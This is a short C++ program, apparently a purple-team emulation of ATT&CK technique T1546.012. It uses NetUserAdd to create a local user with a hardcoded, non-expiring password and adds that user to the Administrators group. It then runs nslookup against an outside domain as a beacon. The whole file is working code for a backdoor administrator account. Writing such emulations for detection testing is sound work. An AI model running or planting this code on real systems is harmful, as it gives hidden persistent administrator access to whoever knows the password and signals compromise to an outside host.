// T1546_012.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>

#include <stdio.h>
#include <windows.h>
#include <LM.h>
#include <string>

int addUserTechnique(void)
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    std::string technique = "T1546_012";
    wchar_t wtext[20];
    mbstowcs(wtext, technique.c_str(), technique.length() + 1);//includes null
    LPWSTR utech = wtext;

    ui.usri1_name = utech;

    std::string password = "purpleteam.ru";
    wchar_t ptext[20];
    mbstowcs(ptext, password.c_str(), password.length() + 1);//includes null
    LPWSTR upass = ptext;

    ui.usri1_password = upass;
    ui.usri1_home_dir = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (ret != NERR_Success)
    {
        return 0;
    }
    account.lgrmi3_domainandname = ui.usri1_name;
    Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (Status != NERR_Success)
    {
        return 0;
    }
    return 1;
}


int main()
{
    addUserTechnique();
    system("cmd /c nslookup -type=any T1546.purpleteam.ru");
}
